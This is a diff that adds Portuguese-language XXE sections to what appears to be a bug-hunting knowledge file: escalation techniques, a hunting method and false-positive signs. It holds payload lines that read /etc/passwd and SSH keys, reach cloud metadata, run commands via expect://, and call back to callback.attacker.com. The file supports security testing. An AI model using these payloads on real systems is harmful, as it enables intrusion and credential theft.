@@ -121,6 +121,39 @@ Casos reais e mentalidade de ataque (RWBH): Yahoo (parsers XML em mail/upload) e
 | CVE-2021-23926 | Apache XMLBeans | 2021 | Parser XML sem properties de seguranca -- Billion Laughs e XXE out-of-band | OOB + DoS |
 | CVE-2021-29505 | XStream | 2021 | RCE via desserializacao de objeto embarcado em XML | RCE via XML |
 
+## Escalation Techniques
+XXE e um vetor versatil que pode escalar para varios impactos:
+
+- **Leitura de arquivos sensiveis:** `<!ENTITY xxe SYSTEM "file:///etc/passwd">` permite ler arquivos do servidor. Escalar para `/etc/shadow`, chaves SSH, configuracoes de banco, credenciais em `.env`.
+- **SSRF via XXE:** `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">` permite acessar metadata de cloud, servicos internos e portas fechadas ao exterior.
+- **Port scanning interno:** variar a porta no SYSTEM URL e observar tempos de resposta ou erros para mapear servicos internos.
+- **RCE via expect://:** em PHP com `expect` habilitado, `<!ENTITY xxe SYSTEM "expect://id">` executa comandos no servidor. Raro mas devastador.
+- **Billion Laughs (DoS):** entidades recursivas consomem memoria exponencialmente, derrubando o parser e potencialmente o servidor inteiro.
+- **Exfiltracao OOB (Out-of-Band):** quando a resposta nao reflete o conteudo, usar parameter entities para enviar dados via DNS ou HTTP para servidor controlado.
+- **XXE em documentos compostos:** DOCX, XLSX, SVG, PDF sao ZIP com XML interno. Upload de documento malicioso pode triggerar XXE no parser server-side.
+
+## Hunting Methodology
+Processo para identificar XXE:
+
+1. **Identificar endpoints que processam XML:** buscar `Content-Type: application/xml`, `text/xml`, `application/soap+xml`. Verificar se a aplicacao aceita XML mesmo quando o Content-Type default e JSON.
+2. **Testar upload de arquivos:** SVG, DOCX, XLSX, PPTX, RSS/Atom feeds -- todos contem XML internamente.
+3. **Injetar DTD basica:** enviar `<!DOCTYPE test [<!ENTITY xxe "CANARY">]><root>&xxe;</root>` e verificar se "CANARY" aparece na resposta.
+4. **Escalar para file read:** trocar `"CANARY"` por `SYSTEM "file:///etc/hostname"`. Se o conteudo do arquivo aparece na resposta, e XXE confirmado.
+5. **Testar OOB:** se a resposta nao reflete o conteudo, usar servidor de callback (Collaborator, interact.sh) com `<!ENTITY xxe SYSTEM "http://callback.attacker.com/xxe">`.
+6. **Testar SAML/SOAP:** endpoints de autenticacao SAML e web services SOAP processam XML por definicao -- testar com DTD injetada.
+7. **Verificar error-based:** enviar SYSTEM URL invalida e observar se o erro vaza informacao do path ou do parser.
+
+## False Positive Indicators
+Sinais de que o finding **nao e XXE exploravel**:
+
+- **Parser rejeita DOCTYPE:** resposta contem erro "DOCTYPE is disallowed" -- parser configurado com `disallow-doctype-decl`.
+- **Entidade nao resolvida:** `&xxe;` aparece literalmente na resposta em vez do conteudo do arquivo.
+- **XML processado client-side:** JavaScript no browser faz o parsing, nao o servidor.
+- **Content-Type nao e XML:** endpoint aceita o body mas o processa como texto plano ou JSON.
+- **Upload aceita mas nao processa XML interno:** servidor armazena o arquivo sem extrair ou renderizar o XML.
+- **OOB callback recebido mas sem dados:** DNS resolve mas nenhum dado e exfiltrado -- pode indicar firewall de egress.
+- **Erro de parsing generico sem vazamento:** "Malformed XML" sem path ou conteudo de arquivo no erro.
+
 ## Target Context (Crawler Hints)
 - **Parâmetros comuns:** `xml`, `data`, `document`, `file`, `upload`, `content`, `body`, `payload`, `svg`, `feed`, `soap`, `saml`, `config`.
 - **Paths comuns:** `/api/import`, `/upload`, `/xml`, `/soap`, `/saml`, `/parse`, `/convert`, `/preview`, `/avatar`, `/invoice`, `/export`.
